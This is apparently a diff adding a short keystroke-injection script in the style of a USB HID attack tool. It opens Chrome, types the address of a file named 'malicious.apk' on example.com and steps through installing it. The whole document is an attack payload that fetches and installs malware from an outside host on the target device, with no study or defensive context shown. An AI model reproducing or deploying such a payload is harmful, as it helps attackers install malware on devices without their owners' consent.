@@ -1,0 +1,13 @@
+DELAY 1500
+GUI
+DELAY 600
+STRING Chrome
+ENTER
+DELAY 1500
+CTRL l
+DELAY 300
+STRING https://example.com/malicious.apk
+ENTER
+DELAY 1000
+STRING Install
+ENTER
